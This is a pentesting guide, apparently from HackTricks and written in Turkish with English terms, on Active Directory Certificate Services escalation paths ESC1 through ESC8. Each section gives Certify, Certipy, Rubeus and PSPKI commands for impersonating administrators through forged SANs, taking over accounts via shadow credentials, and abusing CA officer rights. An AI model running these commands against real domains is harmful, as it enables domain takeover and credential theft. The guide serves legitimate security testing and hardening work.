# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**Bu, gönderilerdeki escalation technique bölümlerinin bir özetidir:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Hatalı Yapılandırılmış Certificate Templates - ESC1

### Açıklama

### Hatalı Yapılandırılmış Certificate Templates - ESC1 Açıklaması

- **Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara enrolment hakları verilir.**
- **Manager approval gerekli değildir.**
- **Yetkili personelin imzaları gerekli değildir.**
- **Certificate templates üzerindeki security descriptor'lar aşırı izin verici şekilde yapılandırılmıştır ve düşük ayrıcalıklı kullanıcıların enrolment hakları elde etmesine olanak tanır.**
- **Certificate templates, authentication'ı kolaylaştıran EKU'ları tanımlayacak şekilde yapılandırılmıştır:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) veya EKU içermeme (SubCA) gibi Extended Key Usage (EKU) tanımlayıcıları dahil edilir.
- **Requester'ların Certificate Signing Request (CSR) içine bir subjectAltName eklemesine template tarafından izin verilir:**
- Active Directory (AD), mevcutsa bir certificate içindeki subjectAltName'i (SAN) identity verification için önceliklendirir. Bu, bir CSR içinde SAN belirtilerek herhangi bir kullanıcının (örneğin bir domain administrator) impersonate edilmesi için certificate talep edilebileceği anlamına gelir. Requester tarafından SAN belirtilip belirtilemeyeceği, certificate template'in AD object'i içindeki `mspki-certificate-name-flag` property tarafından belirtilir. Bu property bir bitmask'tir ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag'inin mevcut olması, SAN'in requester tarafından belirtilmesine izin verir.

> [!CAUTION]
> Açıklanan configuration, düşük ayrıcalıklı kullanıcıların istedikleri herhangi bir SAN ile certificate talep etmesine izin verir ve Kerberos veya SChannel üzerinden herhangi bir domain principal olarak authentication gerçekleştirmelerini mümkün kılar.

Bu feature bazen ürünler veya deployment services tarafından HTTPS ya da host certificate'larının anlık olarak oluşturulmasını desteklemek için veya yeterli anlayış bulunmadığı için etkinleştirilir.

Bu seçenekle bir certificate oluşturulmasının bir warning tetiklediği belirtilmelidir. Ancak mevcut bir certificate template'in (örneğin `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` etkin olan `WebServer` template'inin) duplicate edilip authentication OID'i içerecek şekilde değiştirilmesi durumunda bu gerçekleşmez.<sup>[[6]](#references)</sup>

### Abuse

**Vulnerable certificate templates bulmak** için şunu çalıştırabilirsiniz:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
**Bir yöneticiyi taklit etmek için bu zafiyet kötüye kullanılarak şu komut çalıştırılabilir:**
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
Ardından oluşturulan **sertifikayı `.pfx`** formatına dönüştürebilir ve bunu tekrar **Rubeus veya certipy kullanarak kimlik doğrulamak** için kullanabilirsiniz:<sup>[[5]](#references)</sup>
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows ikili dosyaları olan "Certreq.exe" ve "Certutil.exe", PFX oluşturmak için kullanılabilir: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest'un yapılandırma şemasındaki certificate template'lerin; özellikle onay veya imza gerektirmeyen, Client Authentication ya da Smart Card Logon EKU'suna sahip olan ve `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag'i etkinleştirilmiş template'lerin enumeration işlemi, aşağıdaki LDAP query çalıştırılarak gerçekleştirilebilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Yanlış Yapılandırılmış Certificate Templates - ESC2

### Açıklama

İkinci abuse senaryosu, ilkinin bir varyasyonudur:

1. Enrollment hakları, Enterprise CA tarafından düşük yetkili kullanıcılara verilir.
2. Manager approval gereksinimi devre dışı bırakılır.
3. Authorized signatures gereksinimi atlanır.
4. Certificate template üzerindeki aşırı izin verici security descriptor, düşük yetkili kullanıcılara certificate enrollment hakları verir.
5. **Certificate template, Any Purpose EKU veya herhangi bir EKU içermeyecek şekilde tanımlanır.**

**Any Purpose EKU**, saldırganın client authentication, server authentication, code signing vb. **herhangi bir amaçla** kullanılabilecek bir certificate edinmesine izin verir. **ESC3 için kullanılan technique** bu senaryoyu exploit etmek için de kullanılabilir.

**EKU içermeyen** ve subordinate CA certificate olarak işlev gören certificate'lar **herhangi bir amaçla** exploit edilebilir ve **yeni certificate'ları imzalamak için de kullanılabilir**. Bu nedenle saldırgan, subordinate CA certificate kullanarak yeni certificate'larda rastgele EKU'lar veya alanlar belirtebilir.

Ancak **domain authentication** için oluşturulan yeni certificate'lar, varsayılan ayar olan subordinate CA'nın **`NTAuthCertificates`** object'i tarafından trusted olmaması durumunda çalışmaz. Buna rağmen saldırgan, herhangi bir EKU'ya ve rastgele certificate değerlerine sahip **yeni certificate'lar oluşturabilir**. Bunlar çok çeşitli amaçlar (ör. code signing, server authentication vb.) için potansiyel olarak **abuse** edilebilir ve SAML, AD FS veya IPSec gibi network'teki diğer uygulamalar açısından önemli sonuçlara yol açabilir.<sup>[[6]](#references)</sup>

AD Forest'ın configuration schema'sı içinde bu senaryoyla eşleşen template'leri enumerate etmek için aşağıdaki LDAP query çalıştırılabilir:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Yanlış Yapılandırılmış Enrollment Agent Template'leri - ESC3

### Açıklama

Bu senaryo birinci ve ikinci senaryoya benzer, ancak **farklı bir EKU'nun** (Certificate Request Agent) ve **2 farklı template'in** **abuse** edilmesini içerir (bu nedenle 2 gereksinim kümesi vardır).

**Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), Microsoft dokümantasyonunda **Enrollment Agent** olarak bilinir ve bir principal'ın **başka bir kullanıcı adına** bir **certificate** için **enroll** olmasını sağlar.

**“Enrollment agent”**, böyle bir **template** üzerinde **enroll** olur ve ortaya çıkan **certificate'ı**, diğer kullanıcı adına bir CSR'ı **co-sign etmek** için kullanır. Ardından **co-sign edilmiş CSR'ı**, **“enroll on behalf of”** özelliğine izin veren bir **template** üzerinde **enroll** olmak üzere CA'ya **gönderir** ve CA, **“diğer” kullanıcıya ait** bir **certificate** ile yanıt verir.<sup>[[6]](#references)</sup>

**Gereksinimler 1:**

- Enterprise CA tarafından düşük ayrıcalıklı kullanıcılara enrollment hakları verilir.
- Manager approval gereksinimi devre dışı bırakılmıştır.
- Authorized signatures gereksinimi yoktur.
- Certificate template'in security descriptor'ı aşırı derecede permissive'dir ve düşük ayrıcalıklı kullanıcılara enrollment hakları verir.
- Certificate template, Certificate Request Agent EKU'sunu içerir ve diğer principal'lar adına başka certificate template'leri için request yapılmasını sağlar.

**Gereksinimler 2:**

- Enterprise CA, düşük ayrıcalıklı kullanıcılara enrollment hakları verir.
- Manager approval bypass edilir.
- Template'in schema version'ı 1 veya 2'den büyüktür ve Certificate Request Agent EKU'sunu gerektiren bir Application Policy Issuance Requirement belirtir.
- Certificate template'te tanımlanan bir EKU, domain authentication'a izin verir.
- Enrollment agent'lar için kısıtlamalar CA üzerinde uygulanmaz.

### Abuse

Bu senaryoyu abuse etmek için [**Certify**](https://github.com/GhostPack/Certify) veya [**Certipy**](https://github.com/ly4k/Certipy) kullanabilirsiniz:<sup>[[4]](#references)</sup>
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
**enrollment agent certificate** edinmesine izin verilen **users**, enrollment **agents**'larının enroll olmasına izin verilen templates ve enrollment agent'ın adına hareket edebileceği **accounts**, enterprise CA'ler tarafından kısıtlanabilir. Bu işlem `certsrc.msc` **snap-in**'inin açılması, **CA'ye sağ tıklanması**, **Properties**'e tıklanması ve ardından “Enrollment Agents” sekmesine **gidilmesi** ile gerçekleştirilir.

Ancak CA'ler için **default** ayarın “**Do not restrict enrollment agents**” olduğu belirtilmektedir. Yöneticiler enrollment agents kısıtlamasını etkinleştirip “Restrict enrollment agents” olarak ayarladığında bile, default yapılandırma son derece izin vericidir. **Everyone**'ın tüm templates'lerde herkes adına enroll olmasına izin verir.

## Vulnerable Certificate Template Access Control - ESC4

### **Explanation**

**certificate templates** üzerindeki **security descriptor**, belirli **AD principals**'ın template ile ilgili sahip olduğu **permissions**'ları tanımlar.

Bir **attacker**, bir **template**'i **değiştirmek** ve **önceki bölümlerde** açıklanan herhangi bir **istismar edilebilir yanlış yapılandırmayı** **uygulamak** için gerekli **permissions**'lara sahipse, privilege escalation gerçekleştirilebilir.

Certificate templates için geçerli önemli permissions şunlardır:<sup>[[6]](#references)</sup>

- **Owner:** Nesne üzerinde örtük kontrol sağlar ve tüm attribute'ların değiştirilmesine izin verir.
- **FullControl:** Tüm attribute'ları değiştirme yeteneği de dahil olmak üzere nesne üzerinde tam yetki sağlar.
- **WriteOwner:** Nesnenin owner'ının attacker'ın kontrolündeki bir principal ile değiştirilmesine izin verir.
- **WriteDacl:** Access control'lerin ayarlanmasına ve potansiyel olarak bir attacker'a FullControl verilmesine olanak tanır.
- **WriteProperty:** Herhangi bir object property'sinin düzenlenmesine izin verir.

### Abuse

Templates ve diğer PKI objects üzerinde edit haklarına sahip principals'ları belirlemek için Certify ile enumerate edin:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
Önceki örnektekine benzer bir privesc:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4, bir kullanıcının bir certificate template üzerinde yazma yetkilerine sahip olmasıdır. Bu, örneğin certificate template yapılandırmasının üzerine yazılarak template'in ESC1'e karşı savunmasız hâle getirilmesi için kötüye kullanılabilir.

Yukarıdaki path'te görebildiğimiz gibi, bu yetkilere yalnızca `JOHNPC` sahip; ancak kullanıcımız `JOHN`, `JOHNPC` için yeni `AddKeyCredentialLink` edge'ine sahip. Bu technique certificates ile ilişkili olduğundan, bu saldırıyı da [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) olarak bilinen şekilde uyguladım.<sup>[[8]](#references)</sup> İşte kurbanın NT hash'ini almak için Certipy'nin `shadow auto` command'ına kısa bir ön bakış.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**, tek bir komutla bir sertifika şablonunun yapılandırmasının üzerine yazabilir. **Varsayılan olarak**, yapılandırmanın **ESC1'e karşı savunmasız** hâle gelmesini sağlayacak şekilde üzerine yazar. Ayrıca **eski yapılandırmayı kaydetmek için `-save-old` parametresini belirtebiliriz**; bu, saldırımızdan sonra yapılandırmayı **geri yüklemek** için yararlı olacaktır.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Güvenlik Açığı Bulunan PKI Object Access Control - ESC5

### Açıklama

Certificate Templates ve certificate authority dışındaki çeşitli nesneleri de içeren, birbiriyle bağlantılı ACL tabanlı ilişkiler ağı, tüm AD CS sisteminin güvenliğini etkileyebilir. Güvenliği önemli ölçüde etkileyebilecek bu nesneler şunlardır:

- S4U2Self veya S4U2Proxy gibi mekanizmalar aracılığıyla ele geçirilebilecek CA server'ın AD computer object'i.
- CA server'ın RPC/DCOM server'ı.
- `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` container path'i içindeki herhangi bir descendant AD object'i veya container'ı. Bu path, Certificate Templates container, Certification Authorities container, NTAuthCertificates object ve Enrollment Services Container gibi container ve object'leri içerir, ancak bunlarla sınırlı değildir.

Düşük yetkili bir attacker bu kritik bileşenlerden herhangi birinin kontrolünü ele geçirmeyi başarırsa PKI sisteminin güvenliği tehlikeye girebilir.<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Açıklama

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) içinde ele alınan konu, Microsoft tarafından açıklanan **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag'inin etkilerine de değinmektedir. Bir Certification Authority (CA) üzerinde etkinleştirildiğinde bu configuration, Active Directory® üzerinden oluşturulanlar da dahil olmak üzere **herhangi bir request** için **user-defined values** değerlerinin **subject alternative name** içine eklenmesine izin verir. Sonuç olarak bu özellik, bir **intruder**'ın domain **authentication** için yapılandırılmış **herhangi bir template** üzerinden enrollment gerçekleştirmesine olanak tanır; buna standart User template gibi **unprivileged** kullanıcıların enrollment yapmasına açık template'ler de dahildir. Böylece bir certificate elde edilerek intruder'ın domain administrator veya domain içindeki **başka herhangi bir active entity** olarak authenticate olması sağlanabilir.<sup>[[9]](#references)</sup>

**Not**: `certreq.exe` içindeki `-attrib "SAN:"` argument'ı (“Name Value Pairs” olarak adlandırılır) aracılığıyla bir Certificate Signing Request (CSR) içine **alternative names** ekleme yaklaşımı, ESC1'deki SAN exploitation stratejisinden farklıdır. Buradaki ayrım, account information'ın nasıl encapsulate edildiğidir: bir extension yerine certificate attribute içinde.

### Abuse

Ayarın etkin olup olmadığını doğrulamak için kuruluşlar `certutil.exe` ile aşağıdaki command'i kullanabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Bu işlem esas olarak **remote registry access** kullanır; dolayısıyla alternatif bir yaklaşım şu olabilir:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) ve [**Certipy**](https://github.com/ly4k/Certipy) gibi araçlar bu yanlış yapılandırmayı tespit edip istismar edebilir:<sup>[[4]](#references)</sup>
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Bu ayarları değiştirmek için, **domain administrative** haklarına veya eşdeğerine sahip olunması koşuluyla, aşağıdaki komut herhangi bir iş istasyonundan çalıştırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Bu yapılandırmayı ortamınızda devre dışı bırakmak için flag şu şekilde kaldırılabilir:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> Mayıs 2022 güvenlik güncellemelerinden sonra oluşturulan yeni **sertifikeler**, **istekte bulunan kişinin `objectSid` özelliğini** içeren bir **güvenlik uzantısı** barındıracaktır. ESC1 için bu SID, belirtilen SAN'dan türetilir. Ancak **ESC6** için SID, SAN'ı değil, **istekte bulunan kişinin `objectSid` değerini** yansıtır.\
> ESC6'yı exploit etmek için sistemin, **SAN'ı yeni güvenlik uzantısına göre önceliklendiren** ESC10'a (Weak Certificate Mappings) karşı savunmasız olması gerekir.

## Savunmasız Certificate Authority Erişim Denetimi - ESC7

### Saldırı 1

#### Açıklama

Bir certificate authority için erişim denetimi, CA eylemlerini yöneten bir dizi izin aracılığıyla sağlanır. Bu izinler `certsrv.msc` açılarak, bir CA'ya sağ tıklanıp özellikler seçilerek ve ardından Security sekmesine gidilerek görüntülenebilir. Ayrıca izinler, aşağıdaki gibi komutlarla PSPKI modülü kullanılarak enumerate edilebilir:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Bu, sırasıyla “CA administrator” ve “Certificate Manager” rollerine karşılık gelen başlıca haklar olan **`ManageCA`** ve **`ManageCertificates`** hakkında bilgi sağlar.<sup>[[6]](#references)</sup>

#### Abuse

Bir certificate authority üzerinde **`ManageCA`** haklarına sahip olmak, principal’ın PSPKI kullanarak ayarları uzaktan değiştirmesine olanak tanır. Buna, herhangi bir template’te SAN belirtimine izin vermek için **`EDITF_ATTRIBUTESUBJECTALTNAME2`** flag’ini etkinleştirmek de dahildir; bu, domain escalation açısından kritik bir unsurdur.

Bu işlemin basitleştirilmesi, doğrudan GUI etkileşimi olmadan değişiklik yapılmasına olanak tanıyan PSPKI’nin **Enable-PolicyModuleFlag** cmdlet’i kullanılarak gerçekleştirilebilir.

**`ManageCertificates`** haklarına sahip olmak, bekleyen request’lerin onaylanmasını kolaylaştırır ve “CA certificate manager approval” korumasını etkili bir şekilde atlar.

Bir certificate talep etmek, onaylamak ve indirmek için **Certify** ve **PSPKI** modüllerinin bir kombinasyonu kullanılabilir:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Saldırı 2

#### Açıklama

> [!WARNING]
> **önceki saldırıda**, **`Manage CA`** izinleri **EDITF_ATTRIBUTESUBJECTALTNAME2** flag'ini **etkinleştirmek** ve **ESC6 saldırısını** gerçekleştirmek için kullanılmıştı; ancak CA service (`CertSvc`) yeniden başlatılana kadar bunun herhangi bir etkisi olmaz. Bir kullanıcıda `Manage CA` erişim hakkı olduğunda, bu kullanıcı service'i **yeniden başlatma** yetkisine de sahip olur. Ancak bu, kullanıcının service'i **uzaktan yeniden başlatabileceği** anlamına gelmez. Ayrıca, Mayıs 2022 security update'leri nedeniyle E**SC6, çoğu patched environment'ta varsayılan olarak çalışmayabilir**.

Bu nedenle burada başka bir saldırı sunulmaktadır.

Ön koşullar:

- Yalnızca **`ManageCA` permission**
- **`Manage Certificates`** permission (**`ManageCA`** üzerinden verilebilir)
- **`SubCA`** certificate template'i **etkinleştirilmiş** olmalıdır (**`ManageCA`** üzerinden etkinleştirilebilir)

Teknik, `Manage CA` _ve_ `Manage Certificates` erişim hakkına sahip kullanıcıların **başarısız certificate request'leri yayınlayabilmesi** gerçeğine dayanır. **`SubCA`** certificate template'i **ESC1'e karşı vulnerable** durumdadır, ancak template'e yalnızca **administrators** enroll olabilir. Bu nedenle bir **user**, **`SubCA`** template'ine enroll olmak için **request** gönderebilir - bu request **reddedilir** - ancak daha sonra manager tarafından **yayınlanır**.<sup>[[6]](#references)</sup>

#### Abuse

Kullanıcınızı yeni bir officer olarak ekleyerek **`Manage Certificates`** erişim hakkını kendinize **verebilirsiniz**.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** şablonu, `-enable-template` parametresiyle **CA üzerinde etkinleştirilebilir**. Varsayılan olarak `SubCA` şablonu etkindir.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Bu attack için ön koşulları yerine getirdiysek, **`SubCA` template'ini temel alan bir certificate isteyerek** başlayabiliriz.

**Bu istek reddedilece**ktir, ancak private key'i kaydedecek ve request ID'yi not alacağız.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
**`Manage CA` ve `Manage Certificates`** ile artık `ca` komutunu ve `-issue-request <request ID>` parametresini kullanarak **başarısız sertifika isteğini** yayınlayabiliriz.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
Ve son olarak, `req` komutu ve `-retrieve <request ID>` parametresiyle **verilen sertifikayı alabiliriz**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Saldırı 3 – Manage Certificates Extension Abuse (SetExtension)

#### Açıklama

Klasik ESC7 abuse yöntemlerine (EDITF özniteliklerini etkinleştirme veya bekleyen istekleri onaylama) ek olarak, **Certify 2.0**, Enterprise CA üzerinde yalnızca *Manage Certificates* (diğer adıyla **Certificate Manager / Officer**) rolünü gerektiren yepyeni bir primitive ortaya çıkardı.<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC yöntemi, *Manage Certificates* yetkisine sahip herhangi bir principal tarafından çalıştırılabilir. Bu yöntem geleneksel olarak meşru CA'ler tarafından **bekleyen** isteklerdeki uzantıları güncellemek için kullanılsa da saldırgan, onay bekleyen bir isteğe *varsayılan olmayan* bir certificate extension (örneğin `1.1.1.1` gibi özel bir *Certificate Issuance Policy* OID'si) **eklemek** için bu yöntemi abuse edebilir.

Hedeflenen template bu uzantı için **varsayılan bir değer tanımlamıyorsa**, istek sonradan verildiğinde CA saldırgan tarafından kontrol edilen değerin üzerine yazmaz. Bu nedenle ortaya çıkan certificate, saldırganın seçtiği bir uzantıyı içerir ve bu uzantı:

* Diğer vulnerable template'lerin Application / Issuance Policy gereksinimlerini karşılayabilir (privilege escalation ile sonuçlanır).
* Üçüncü taraf sistemlerde certificate'a beklenmedik trust sağlayan ek EKU'lar veya policy'ler enjekte edebilir.

Kısacası, daha önce ESC7'nin “daha az güçlü” yarısı olarak kabul edilen *Manage Certificates*, CA configuration'a dokunmadan veya daha kısıtlayıcı *Manage CA* yetkisini gerektirmeden full privilege escalation ya da uzun vadeli persistence için artık kullanılabilir.

#### Certify 2.0 ile primitive'i abuse etme

1. **Bekleyen durumda kalacak bir certificate request gönderin.** Bu, manager approval gerektiren bir template ile zorlanabilir:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Döndürülen Request ID'yi not alın
```

2. Yeni `manage-ca` komutunu kullanarak **bekleyen isteğe özel bir extension ekleyin**:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # sahte issuance-policy OID'si
```
*Template zaten *Certificate Issuance Policies* extension'ını tanımlamıyorsa yukarıdaki değer issuance sonrasında korunur.*

3. **İsteği verin** (rolünüzde *Manage Certificates* approval yetkileri de varsa) veya bir operatörün isteği onaylamasını bekleyin. Verildikten sonra certificate'ı indirin:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Ortaya çıkan certificate artık kötü amaçlı issuance-policy OID'sini içerir ve sonraki saldırılarda (ör. ESC13, domain escalation vb.) kullanılabilir.

> NOT: Aynı saldırı, `ca` komutu ve `-set-extension` parametresi aracılığıyla Certipy ≥ 4.7 ile de gerçekleştirilebilir.

## AD CS HTTP Endpoint'lerine NTLM Relay – ESC8

### Açıklama

> [!TIP]
> **AD CS'nin kurulu olduğu** ortamlarda, **vulnerable bir web enrollment endpoint'i** mevcutsa ve **domain computer enrollment ile client authentication'a izin veren en az bir certificate template** (varsayılan **`Machine`** template'i gibi) yayınlanmışsa, **spooler service'i aktif olan herhangi bir computer'ın bir saldırgan tarafından compromise edilmesi mümkün hale gelir**!

AD CS tarafından çeşitli **HTTP tabanlı enrollment yöntemleri** desteklenir ve bunlar yöneticilerin kurabileceği ek server role'leri aracılığıyla kullanıma sunulur. HTTP tabanlı certificate enrollment için kullanılan bu interface'ler **NTLM relay saldırılarına** açıktır. Saldırgan, **compromise edilmiş bir machine üzerinden inbound NTLM ile authentication yapan herhangi bir AD account'unu impersonate edebilir**. Saldırgan, victim account'unu impersonate ederken bu web interface'lerine erişerek `User` veya `Machine` certificate template'lerini kullanıp client authentication certificate **request edebilir**.

- **Web enrollment interface** (`http://<caserver>/certsrv/` adresinde bulunan eski bir ASP application), varsayılan olarak yalnızca HTTP kullanır ve bu da NTLM relay saldırılarına karşı koruma sağlamaz. Ayrıca Authorization HTTP header üzerinden yalnızca NTLM authentication'a açıkça izin verir; bu nedenle Kerberos gibi daha güvenli authentication yöntemleri kullanılamaz.
- **Certificate Enrollment Service** (CES), **Certificate Enrollment Policy** (CEP) Web Service ve **Network Device Enrollment Service** (NDES), varsayılan olarak Authorization HTTP header üzerinden negotiate authentication'ı destekler. Negotiate authentication hem Kerberos'u hem de **NTLM'i** destekler ve saldırganın relay saldırıları sırasında authentication'ı **NTLM'e downgrade etmesine** olanak tanır. Bu web service'leri varsayılan olarak HTTPS'i etkinleştirse de HTTPS tek başına **NTLM relay saldırılarına karşı koruma sağlamaz**. HTTPS service'lerini NTLM relay saldırılarına karşı korumak yalnızca HTTPS, channel binding ile birlikte kullanıldığında mümkündür. Ne yazık ki AD CS, channel binding için gerekli olan IIS üzerindeki Extended Protection for Authentication'ı etkinleştirmez.<sup>[[6]](#references)</sup>

NTLM relay saldırılarındaki yaygın bir **sorun**, NTLM session'larının **kısa süreli olması** ve saldırganın **NTLM signing gerektiren** service'lerle etkileşime girememesidir.

Bununla birlikte bu sınırlama, user için bir certificate elde etmek amacıyla NTLM relay saldırısından yararlanılarak aşılabilir; çünkü session'ın süresini certificate'ın geçerlilik süresi belirler ve certificate, **NTLM signing zorunlu olan** service'lerle kullanılabilir. Stolen certificate kullanma talimatları için bkz.:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay saldırılarının bir diğer sınırlaması, **saldırganın kontrolündeki bir machine'in victim account tarafından authenticate edilmesi gerekmesidir**. Saldırgan ya bekleyebilir ya da bu authentication'ı **force etmeyi** deneyebilir:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)'nin `cas` komutu **etkin HTTP AD CS endpoint'lerini** enumerate eder:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

